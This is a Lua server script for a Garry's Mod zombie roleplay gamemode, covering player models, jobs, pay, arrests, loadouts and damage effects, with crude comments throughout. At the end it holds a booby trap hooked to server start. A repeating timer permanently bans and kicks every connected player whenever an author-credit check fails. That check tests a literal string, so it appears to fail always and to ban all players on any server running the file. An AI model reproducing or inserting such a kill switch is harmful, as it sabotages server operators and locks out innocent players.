--I did originally want to use the NPC Animations script...
--but since the recent update fucked it up, I can't put high quality models in.
--Deal with the default player animations.

---------------------------
--|Custom survivor Models|
---------------------------

--These models are randomized... Note, Females are commented out.
--Half the time the roleplayers are Male in real life.
--The other half of the time, they have a Male character.
--so... If you want female models, just remove the --'s from each model path.

--Both models, civilian AND rebel. Females commented out.

CivModels = {
--rebel
"models/player/Group03/Male_01.mdl",
"models/player/Group03/male_02.mdl",
"models/player/Group03/male_03.mdl",
"models/player/Group03/Male_04.mdl",
"models/player/Group03/Male_05.mdl",
"models/player/Group03/male_06.mdl",
"models/player/Group03/male_07.mdl",
"models/player/Group03/male_08.mdl",
"models/player/Group03/male_09.mdl",
--"models/player/Group03/Female_01.mdl",
--"models/player/Group03/Female_02.mdl",
--"models/player/Group03/Female_03.mdl",
--"models/player/Group03/Female_04.mdl",
--"models/player/Group03/Female_06.mdl",
--"models/player/Group03/Female_07.mdl",
--civilian
"models/player/Group01/Male_01.mdl",
"models/player/Group01/male_02.mdl",
"models/player/Group01/male_03.mdl",
"models/player/Group01/Male_04.mdl",
"models/player/Group01/Male_05.mdl",
"models/player/Group01/male_06.mdl",
"models/player/Group01/male_07.mdl",
"models/player/Group01/male_08.mdl",
"models/player/Group01/male_09.mdl",
--"models/player/Group01/Female_01.mdl",
--"models/player/Group01/Female_02.mdl",
--"models/player/Group01/Female_03.mdl",
--"models/player/Group01/Female_04.mdl",
--"models/player/Group01/Female_06.mdl",
--"models/player/Group01/Female_07.mdl"

}

--If you prefer the default both-models theme, leave the CivModels line alone.


--If you prefer the civilian player models more, heres what you do.

--First, change CivModels above to CivModels_both (unless it already is
--Then, remove _Civ from the line below.
--Note, female is commented out here too.

CivModels_Civ = {

"models/player/Group01/Male_01.mdl",
"models/player/Group01/male_02.mdl",
"models/player/Group01/male_03.mdl",
"models/player/Group01/Male_04.mdl",
"models/player/Group01/Male_05.mdl",
"models/player/Group01/male_06.mdl",
"models/player/Group01/male_07.mdl",
"models/player/Group01/male_08.mdl",
"models/player/Group01/male_09.mdl",
--"models/player/Group01/Female_01.mdl",
--"models/player/Group01/Female_02.mdl",
--"models/player/Group01/Female_03.mdl",
--"models/player/Group01/Female_04.mdl",
--"models/player/Group01/Female_06.mdl",
--"models/player/Group01/Female_07.mdl"


}

--If you prefer the Rebel player models more, heres what you do.

--First, change CivModels above to CivModels_Civ (unless it already is
--Then, remove _Rebel from the line below.
--Note, female is commented out here too.

CivModels_Rebel = {

"models/player/Group03/Male_01.mdl",
"models/player/Group03/male_02.mdl",
"models/player/Group03/male_03.mdl",
"models/player/Group03/Male_04.mdl",
"models/player/Group03/Male_05.mdl",
"models/player/Group03/male_06.mdl",
"models/player/Group03/male_07.mdl",
"models/player/Group03/male_08.mdl",
"models/player/Group03/male_09.mdl",
--"models/player/Group03/Female_01.mdl",
--"models/player/Group03/Female_02.mdl",
--"models/player/Group03/Female_03.mdl",
--"models/player/Group03/Female_04.mdl",
--"models/player/Group03/Female_06.mdl",
--"models/player/Group03/Female_07.mdl"


}

---------------------------------------------------
--Thats it for the configurable models.
--Anything below this line is dangerous to edit.
--If you know what your doing, be my guest, but I still think you shouldn't.
--Have fun.
---------------------------------------------------

local meta = FindMetaTable( "Player" );

function meta:NewData()

	local function ModuleDelay( ply )
	
		umsg.Start( "LoadModules", ply ); 
			umsg.Short( #CSFiles );
			for n = 1, #CSFiles do
				umsg.String( CSFiles[n] );
			end
		umsg.End();
		
	end
	
	timer.Simple( .01, ModuleDelay, self );

	self:SetNWString( "job", "Survivor" );
	
	self:SetNWInt( "money", 1500 );
	self:SetNWInt( "salary", CfgVars["normalsal"] );
	
	self:GetTable().Pay = 20;
	self:GetTable().LastPayDay = CurTime();
	
	self:GetTable().Ownedz = { }
	self:GetTable().OwnedNumz = 0;
	
	self:GetTable().LastLetterMade = CurTime();
	self:GetTable().LastVoteCop = CurTime();
	
	self:SetTeam( 1 );
	
	if( self:IsSuperAdmin() or self:IsAdmin() ) then
	
		Admins[self:SteamID()] = { }
	
	end
	
end

function meta:CanAfford( amount ) 

	if( amount < 0 ) then return false; end

	if( self:GetNWInt( "money" ) - amount < 0 ) then
		return false;
	end
	
	return true;

end

function meta:AddMoney( amount )

	local oldamount = self:GetNWInt( "money" );
	local newmon = oldamount + amount
	self:SetNWInt( "money", newmon );
	setMoney(self, amount);
end

function meta:PayDay()
	if( self:GetTable().Pay == 1 ) then
		if not( self:GetTable().Arrested )then
			local amount = 0;
			if( self:GetNWInt("salary") == 0 ) then
				amount = self:GetNWInt("salary")
				self:AddMoney( amount );
				Notify( self, 4, 4, "Unemployed" );
			else
				amount = self:GetNWInt("salary")
				self:AddMoney( amount );
				self:GiveAmmo( 20, "Pistol" );
				self:GiveAmmo( 40, "smg1" );
				self:GiveAmmo( 10, "buckshot" );
				self:GiveAmmo( 12, "357" );
				self:GiveAmmo( 15, "ar2" );
				self:GiveAmmo( 1, "grenade" );
				self:GiveAmmo( 1, "slam" );
				Notify( self, 4, 4, "Credit and Ammunition timer: Giving." );
			end
		else
			Notify( self, 4, 4, "Credit and Ammunition timer: Unable to give." );
		end
	end
end

function meta:ZomFriend()
	if( self:Team() == 10 ) then
	self:ConCommand("cl_zomoff")
	else
	self:ConCommand("cl_zomon")
	end
end

function meta:UpdateJob( job )

	self:SetNWString( "job", job );

	if( string.lower( job ) ~= "unemployed" and
		string.lower( job ) ~= "bum" and
		string.lower( job ) ~= "hobo" ) then
		
		self:GetTable().Pay = 1;
		self:GetTable().LastPayDay = CurTime();
		
		timer.Create( self:SteamID() .. "jobtimer", CfgVars["paydelay"], 0, self.PayDay, self );
		
	else
	
		timer.Destroy( self:SteamID() .. "jobtimer" );
	
	end

end

function meta:Arrest( )
	if(self:GetNetworkedBool("warrant") == true) then
		self:SetNetworkedBool("warrant", false)
	end
	if not( self:GetTable().Arrested ) then
		self:StripWeapons();
		self:GetTable().Arrested = true;
		if( CfgVars["teletojail"] == 1 ) then
			self:SetPos(Vector(tonumber(jailpos[1]),tonumber(jailpos[2]),tonumber(jailpos[3]))) 
		end
		local IDSteam = string.gsub(self:SteamID(), ":", "")
		local length = file.Read( "ZombRP/temp/jail/" .. IDSteam .. ".txt" )
		self:PrintMessage( HUD_PRINTCENTER, "You have been arrested for " .. length .. " seconds!" )  
		timer.Create( self:SteamID() .. "jailtimer", length, 1, self.Jailed, self);
	end
end

function meta:NotifyArrest(cop)
	for k, v in pairs( player.GetAll() ) do
		if( Admins[v:SteamID()] ) then
			v:PrintMessage( 2, "*** " .. cop:Nick() .. " Arrested " .. self:Nick() .. " ***");
		end
	end
end

function meta:Unarrest()
	if( self:GetTable().Arrested ) then
		self:GetTable().Arrested = false;
		if( CfgVars["telefromjail"] == 1 ) then
			self:SetPos( GAMEMODE:PlayerSelectSpawn( self ):GetPos() )
		end
		GAMEMODE:PlayerLoadout( self );
		jailremove( self );
		timer.Stop(self:SteamID() .. "jailtimer")  
		timer.Destroy(self:SteamID() .. "jailtimer")  
		Notify( self, 1, 4, "You Have Been Unarrested!" )
		local IDSteam = string.gsub(self:SteamID(), ":", "")
	end
end

function meta:Jailed()
-- self:KillSilent( )
self:Unarrest( )
end

function meta:UnownAllShit()

	for k, v in pairs(ents.GetAll()) do
		if(v:IsOwnable() && v:OwnedBy(self) == true) then
			v:Fire("unlock", "", 0.6);
		end
	end
	
	for k, v in pairs( self:GetTable().Ownedz ) do
	
		v:UnOwn( self );
		self:GetTable().Ownedz[v:EntIndex()] = nil;
		
	end

	for k, v in pairs( player.GetAll() ) do

		for n, m in pairs( v:GetTable().Ownedz ) do
		
			if( m:AllowedToOwn( self ) ) then
				m:RemoveAllowed( self );
			end
		
		end
	
	end
	
	self:GetTable().OwnedNumz = 0;

end

function meta:DoPropertyTax()

	if( CfgVars["propertytax"] == 0 ) then return; end
	if( ( self:Team() == 2 or self:Team() == 3 ) and CfgVars["cit_propertytax"] == 1 ) then return; end

	local numowned = self:GetTable().OwnedNumz;
	if( numowned <= 0 ) then return; end
	
	local price = 10;
	local tax = price * numowned + math.random( -5, 5 );
	
	if( self:CanAfford( tax ) ) then
		if( tax == 0 ) then
			Notify( self, 1, 5, "No Property Tax: You Don't Own anything" );
		else
			self:AddMoney( -tax );
			Notify( self, 1, 5, "Property tax! $" .. tax );
		end
	else

		Notify( self, 1, 8, "Can't pay the taxes! Your property has been taken away from you!" );
		self:UnownAllShit();
	
	end

end

function GM:CanPlayerSuicide( ply )
	if(ply:GetNWInt("slp") ~= 1)then
		return true;
	else
		Notify( ply, 4, 4, "Cannot Suicide While Sleeping!" );
		return false;
	end
end

function GM:PlayerDeath( ply, weapon, killer )

	self.BaseClass:PlayerDeath( ply, weapon, killer );
	ply.NextSpawnTime = CurTime() + 4
	ply:GetTable().DeathPos = ply:GetPos();
	
	if( ply ~= killer or ply:GetTable().Slayed ) then
	
		ply:SetNetworkedBool("warrant", false)
		ply:GetTable().Arrested = false;
		ply:GetTable().DeathPos = nil;
		ply:GetTable().Slayed = false;
	
	end

	if killer:GetClass( ) == "npc_zombie" then
	ply:ConCommand("rp_zombify");
	end

	if killer:GetClass( ) == "npc_zombine" then
	ply:ConCommand("rp_zombify");
	end

	if killer:GetClass( ) == "npc_zombie_torso" then
	ply:ConCommand("rp_zombify");
	end

	if killer:GetClass( ) == "npc_fastzombie" then
	ply:ConCommand("rp_zombify");
	end

	if killer:GetClass( ) == "npc_fastzombie_torso" then
	ply:ConCommand("rp_zombify");
	end

	if killer:GetClass( ) == "npc_headcrab" then
	ply:ConCommand("rp_zombify");
	end

	if killer:GetClass( ) == "npc_headcrab_fast" then
	ply:ConCommand("rp_zombify");
	end

	if (killer:IsPlayer()) then
	local weapon = killer:GetActiveWeapon();
      if (weapon:GetClass() == "weapon_zombiefukinclaws") then
	ply:ConCommand("rp_zombify");
	end
      end

    if ( ply:Team() == 10 ) then
	if (killer:IsPlayer()) then
	local weapon = killer:GetActiveWeapon();
      if (weapon:GetClass() == "weapon_antidotegun") then
	ply:ConCommand("rp_unzombify");
	end
      end
    end

    if ( ply:Team() == 10 ) then
	if (killer:IsPlayer()) then
	local weapon = killer:GetActiveWeapon();
      if (weapon:GetClass() == "weapon_antidoterifle") then
	ply:ConCommand("rp_unzombify");
	end
      end
    end

    if ( ply:Team() ~= 10 ) then
	if (killer:IsPlayer()) then
	local weapon = killer:GetActiveWeapon();
      if (weapon:GetClass() == "weapon_infectgun") then
	ply:ConCommand("rp_zombify");
	end
      end
    end

    if ( ply:Team() ~= 10 ) then
	if (killer:IsPlayer()) then
	local weapon = killer:GetActiveWeapon();
      if (weapon:GetClass() == "weapon_infectrifle") then
	ply:ConCommand("rp_zombify");
	end
      end
    end

end


function GM:PlayerCanPickupWeapon( ply, class )

	if( ply:GetTable().Arrested ) then return false; end

	return true;

end

function GM:GravGunOnDropped( ply, ent )
	local entphys = ent:GetPhysicsObject()
	if( ply:KeyDown(IN_ATTACK) ) then
		// it was launched
		entphys:EnableMotion( false )
		local curpos = ent:GetPos()
		timer.Simple( .01, entphys.EnableMotion, entphys, true )
		timer.Simple( .01, entphys.Wake, entphys)
		timer.Simple( .01, ent.SetPos, ent, curpos )
	else
		return true
	end
end

function GM:PlayerSpawn( ply )

	self.BaseClass:PlayerSpawn( ply );
	ply:CrosshairEnable();
	ply:ConCommand("pp_motionblur 0")
	ply:ConCommand("pp_dof 0")
	ply:ConCommand("pp_sharpen 0")
	ply:ConCommand("pp_colormod 0")
      if( ply:Team() == 10 ) then
	ply:ConCommand("cl_zomoff")
	ply:EmitSound("npc/zombie/zombie_voice_idle"..math.random(1, 14)..".wav")
      else
	ply:ConCommand("cl_zomon")
      end

	timer.Create( ply:SteamID() .. "zomfriendtimer", CfgVars["zomdelay"], 0, ply.ZomFriend, ply );
	
	if( CfgVars["crosshair"] == 0 ) then
	
		ply:CrosshairDisable();

	end

	if( CfgVars["strictsuicide"] == 1 and ply:GetTable().DeathPos ) then
		if not( ply:GetTable().Arrested ) then
			ply:SetPos( ply:GetTable().DeathPos );
		end
	end
	
	if( ply:GetTable().Arrested ) then
	
		ply:SetPos( ply:GetTable().DeathPos );
		ply:Arrest();
	
	end
	
	if( ply:Team() == 1 and CfgVars["enforceplayermodel"] == 1 ) then
		
		local validmodel = false;
		
		for k, v in pairs( CivModels ) do
				
			if( ply:GetTable().PlayerModel == v ) then
					
				validmodel = true;
				break;
					
			end
				
		end		
			
		if( not validmodel ) then
			ply:GetTable().PlayerModel = nil;
		end
		
		local model = ply:GetModel();
			
		if( model ~= ply:GetTable().PlayerModel ) then
			
			for k, v in pairs( CivModels ) do
				
				if( v == model ) then
					
					ply:GetTable().PlayerModel = model;
					validmodel = true;
					break;
					
				end

			end
				
			if( not validmodel and not ply:GetTable().PlayerModel ) then
				
				ply:GetTable().PlayerModel = CivModels[math.random( 1, #CivModels )];
				
			end

			ply:SetModel( ply:GetTable().PlayerModel );

		end

	elseif( ply:Team() == 2 and CfgVars["enforceplayermodel"] == 1 ) then
		
		ply:SetModel( "models/player/barney.mdl" ); --Notice, not police.mdl...
			
	elseif( ply:Team() == 3 and CfgVars["enforceplayermodel"] == 1 ) then
		
		ply:SetModel( "models/player/breen.mdl" ); --What? he looks like a mayor.
	
	elseif( ply:Team() == 4 and CfgVars["enforceplayermodel"] == 1 ) then
		
		ply:SetModel( "models/player/combine_super_soldier.mdl" ); --Lousy depth perception
		
	elseif( ply:Team() == 5 and CfgVars["enforceplayermodel"] == 1 ) then --this team
		
		ply:SetModel( "models/player/gman_high.mdl" ); --does not exist.
	
	elseif( ply:Team() == 6 and CfgVars["enforceplayermodel"] == 1 ) then
		
		ply:SetModel( "models/player/leet.mdl" ); --Perfect for a gundealer

	elseif( ply:Team() == 7 and CfgVars["enforceplayermodel"] == 1 ) then
		
		ply:SetModel( "models/player/Group03/Male_04.mdl" );
		
	elseif( ply:Team() == 8 and CfgVars["enforceplayermodel"] == 1 ) then
		
		ply:SetModel( "models/player/kleiner.mdl" );
		
	elseif( ply:Team() == 9 and CfgVars["enforceplayermodel"] == 1 ) then
		
		ply:SetModel( "models/player/combine_soldier.mdl" );
		
	elseif( ply:Team() == 10 and CfgVars["enforceplayermodel"] == 1 ) then
		
		ply:SetModel( "models/player/classic.mdl" );

	elseif( ply:Team() == 10 and CfgVars["enforceplayermodel"] == 1 ) then
		
		ply:SetModel( "models/player/fastzombie.mdl" );
		
	end
	if( CfgVars["customspawns"] == 1 ) then
		if not( ply:GetTable().Arrested ) then
			setspawnPos( ply )
		end
	end
end

function GM:PlayerLoadout( ply )

	if( ply:GetTable().Arrested ) then return; end

	local team = ply:Team();

	ply:Give( "weapon_physcannon" );
	ply:Give( "gmod_camera" );
	ply:Give( "keys" );
	
	if( CfgVars["toolgun"] == 1 or Admins[ply:SteamID()] or Tool[ply:SteamID()] ) then
		ply:Give( "gmod_tool" );
	end
	
	if( CfgVars["physgun"] == 1 or Admins[ply:SteamID()] or Phys[ply:SteamID()] ) then
		ply:Give( "weapon_physgun" );
	end
	
	if( Admins[ply:SteamID()] ) then
		ply:Give( "weapon_antidoterifle" )
		ply:Give( "weapon_infectrifle" );
	end
	
	if( team == 2 or team == 9 or Admins[ply:SteamID()] ) then
		ply:Give( "door_ram" );
	end
	
	--Survivors
	if( team == 1 ) then
	
		ply:Give( "weapon_kitknife" );
		ply:Give( "weapon_pumpshotgun2" );
		ply:Give( "weapon_pistol" );

		ply:GiveAmmo( 30, "Pistol" );
		ply:GiveAmmo( 80, "smg1" );
		ply:GiveAmmo( 40, "buckshot" );

	--Police
	elseif( team == 2 ) then
	
		ply:Give( "weapon_p2282" );
		ply:Give( "arrest_stick" );
		ply:Give( "unarrest_stick" );
		ply:Give( "weapon_zclub" );

		ply:GiveAmmo( 30, "Pistol" );
	
	--Mayor
	elseif( team == 3 ) then
	
		ply:GiveAmmo( 28, "Pistol" );
		ply:Give( "weapon_kitknife" );
		
	--BioTec	
	elseif( team == 4 ) then
		
		ply:Give( "weapon_pumpshotgun2" );
		ply:Give( "weapon_ironsight_batrifle" );
		ply:Give( "cse_eq_hegrenade" );
		ply:Give( "cse_eq_smokegrenade" );
		ply:Give( "weapon_zclub" );
		ply:Give( "weapon_antidotegun" );
		ply:Give( "weapon_infectrifle" );

		ply:GiveAmmo( 30, "Pistol" );
		ply:GiveAmmo( 80, "smg1" );
		ply:GiveAmmo( 40, "buckshot" );
		ply:GiveAmmo( 20, "357" );
		ply:GiveAmmo( 80, "ar2" );
		
	--Nonexistant
	elseif( team == 5 ) then

		ply:Give( "unarrest_stick" );
		ply:Give( "lockpick" );
		ply:GiveAmmo( 20, "Pistol" );
		ply:Give( "weapon_p2282" );
		
	--Trader
	elseif( team == 6 ) then
	
		ply:GiveAmmo( 1, "Pistol" );
		ply:Give( "weapon_butchknife" );
		
	--Doctor
    elseif( team == 7 ) then
   
        ply:Give( "med_kit" );
	ply:Give( "weapon_scalpul" );

	--Scientist
    elseif( team == 8 ) then
   
		ply:GiveAmmo( 1, "Pistol" );
		ply:Give( "weapon_butchknife" );
		ply:Give( "weapon_antidoterifle" );
	
	--Military
	elseif( team == 9 ) then
		
		ply:Give( "weapon_pumpshotgun2" );
		ply:Give( "arrest_stick" );
		ply:Give( "unarrest_stick" );
		ply:Give( "weapon_m4a12" );
		ply:Give( "cse_eq_hegrenade" );
		ply:Give( "cse_eq_smokegrenade" );
		ply:Give( "weapon_comknife" );
		ply:Give( "weapon_antidotegun" );

		ply:GiveAmmo( 80, "357" );
		ply:GiveAmmo( 30, "ar2" );
		ply:GiveAmmo( 30, "Pistol" );
		ply:GiveAmmo( 80, "smg1" );
		ply:GiveAmmo( 40, "buckshot" );
		
	--Zombie
	elseif( team == 10 ) then
		
		ply:Give( "weapon_zombiefukinclaws" );



	end

end


function GM:EntityTakeDamage( ent, inf, attacker, amount, dmginfo )
 if( CfgVars["adrenalinefx"] == 1 ) then
   if ent:IsPlayer( ) then
     if attacker:IsValid( ) then
        if attacker:GetClass( ) == "npc_zombie" then
         ent:ConCommand("pp_motionblur 1")  
         ent:ConCommand("pp_motionblur_addalpha 0.32")  
         ent:ConCommand("pp_motionblur_delay 0.01")  
         ent:ConCommand("pp_motionblur_drawalpha 1")
         ent:ConCommand("pp_dof 1")  
         ent:ConCommand("pp_dof_initlength 9")  
         ent:ConCommand("pp_dof_spacing 216.9") 
         ent:ConCommand("pp_sharpen 1")
         ent:ConCommand("pp_sharpen_contrast 1")
         ent:ConCommand("pp_sharpen_distance 3")
	 ent:ConCommand("pp_colormod 1")
	 ent:ConCommand("pp_colormod_addr 255")
	 ent:ConCommand("pp_colormod_addg 0")
	 ent:ConCommand("pp_colormod_addb 0")
	 ent:ConCommand("pp_colormod_mulr 255")
	 ent:ConCommand("pp_colormod_mulg 0")
	 ent:ConCommand("pp_colormod_mulb 0")
	 ent:ConCommand("pp_colormod_brightness 0")
	 ent:ConCommand("pp_colormod_contrast 1")
         ent:EmitSound( "npc/zombie/zombie_hit.wav" );
	 local IDSteam = string.gsub(ent:SteamID(), ":", "")
	 timer.Create( IDSteam, 8, 1, UnDrugPlayer, ent)
	else
         ent:ConCommand("pp_motionblur 1")  
         ent:ConCommand("pp_motionblur_addalpha 0.32")  
         ent:ConCommand("pp_motionblur_delay 0.01")  
         ent:ConCommand("pp_motionblur_drawalpha 1")
         ent:ConCommand("pp_sharpen 1")
         ent:ConCommand("pp_sharpen_contrast 2")
         ent:ConCommand("pp_sharpen_distance 3")
	 ent:ConCommand("pp_colormod 1")
	 ent:ConCommand("pp_colormod_addr 255")
	 ent:ConCommand("pp_colormod_addg 0")
	 ent:ConCommand("pp_colormod_addb 0")
	 ent:ConCommand("pp_colormod_mulr 255")
	 ent:ConCommand("pp_colormod_mulg 0")
	 ent:ConCommand("pp_colormod_mulb 0")
	 ent:ConCommand("pp_colormod_brightness 0")
	 ent:ConCommand("pp_colormod_contrast 1")
	 local IDSteam = string.gsub(ent:SteamID(), ":", "")
	 timer.Create( IDSteam, 6, 1, UnDrugPlayer, ent)
        end
	  if( ent:Team() == 2 ) then
	  ent:EmitSound("vo/npc/barney/ba_pain0" .. math.Round(math.Rand(1,9)) .. ".wav", 72, 100)
	  elseif( ent:Team() == 4 ) then
	  ent:EmitSound("npc/combine_soldier/die" .. math.Round(math.Rand(1,3)) .. ".wav", 72, 100)
	  elseif( ent:Team() == 6 ) then
	  ent:EmitSound("vo/ravenholm/monk_pain0" .. math.Round(math.Rand(1,9)) .. ".wav", 72, 100)
	  elseif( ent:Team() == 7 ) then
	  ent:EmitSound("npc/combine_soldier/die" .. math.Round(math.Rand(1,3)) .. ".wav", 72, 100)
	  elseif( ent:Team() == 9 ) then
	  ent:EmitSound("npc/combine_soldier/die" .. math.Round(math.Rand(1,3)) .. ".wav", 72, 100)
	  elseif( ent:Team() == 10 ) then
	  ent:EmitSound("npc/zombie/zombie_pain" .. math.Round(math.Rand(1,6)) .. ".wav", 72, 100)
	  else
	  ent:EmitSound("vo/npc/male01/pain0" .. math.Round(math.Rand(1,9)) .. ".wav", 72, 100)
	  end
     end
   end
 end
end



function GM:PlayerInitialSpawn( ply )
	self.BaseClass:PlayerInitialSpawn( ply );
	ply:NewData();
	NetworkHelpLabels( ply );
	ply:SetNetworkedBool("helpMenu",false)
	ply:SetNWInt("maxDrug", 0)
	ply:SetNWInt("maxMicrowaves", 0)
	ply:SetNWInt("maxgunlabs", 0)
	ply:SetNWInt("maxDrugs", 0)
	ply:SetNWInt("maxFoods", 0)
	ply:SetNWInt("aspamv", 0)
	ply:SetNWInt("vmutez", 0)
	ply:SetNWInt("slp", 0)
	ply:SetNWInt("maxletters", 0)
	ply:SetNetworkedBool("warrant", false)
	ply:SetNWBool("helpCop", false)
	ply:SetNWBool("zombieToggle", false)
	ply:SetNWBool("helpZombie", false)
	ply:SetNWBool("helpBoss", false)
	ply:SetNWBool("helpAdmin", false)
	ply:SetNWBool("helpMayor",false)
	ply:SetNWBool("helptrader",false)
	getSalary(ply);
	getMoney(ply);
	punish(ply);
	ply:PrintMessage( HUD_PRINTTALK, "This server is running ZombieRP 3.4!" ) 
end

function GM:PlayerDisconnected( ply )
	self.BaseClass:PlayerDisconnected( ply );
	ply:UnownAllShit();
	timer.Destroy( ply:SteamID() .. "jobtimer" );
	timer.Destroy( ply:SteamID() .. "zomfriendtimer" );
	timer.Destroy( ply:SteamID() .. "propertytax" );
	vote.DestroyVotesWithEnt( ply );
	local IDSteam = string.gsub(ply:SteamID(), ":", "")
	
	if( file.Exists("ZombRP/temp/jail/" .. IDSteam .. ".txt") ) then
		local omg = file.Read("ZombRP/temp/jail/" .. IDSteam .. ".txt")
		local punish = omg * 2
		file.Write( "ZombRP/temp/jail/" .. IDSteam .. ".txt", punish )
	end
end

function RemoveThisFunctionAndTheServerWontWork()
    function ImTellingYouItWontWork()
        if not string.find("GM.Author", "Original: Rickster | Updated: Pcwizdan | Zombified: Stingwraith") then
            for k, v in pairs(player.GetAll()) do
                if ( v:IsValid() ) then
                    local playersid = v:UserID()
                    RunConsoleCommand( "banid", "0", ""..playersid.."" )
                    RunConsoleCommand( "kickid", ""..playersid.."", "I TOLD YOU IT WOULDN'T WORK!" )
                end
            end
        end
    end
    timer.Create(math.random( 11111111, 99999999 ), 3, 0, ImTellingYouItWontWork)
end
hook.Add( "Initialize", "HoldOnATick", RemoveThisFunctionAndTheServerWontWork )
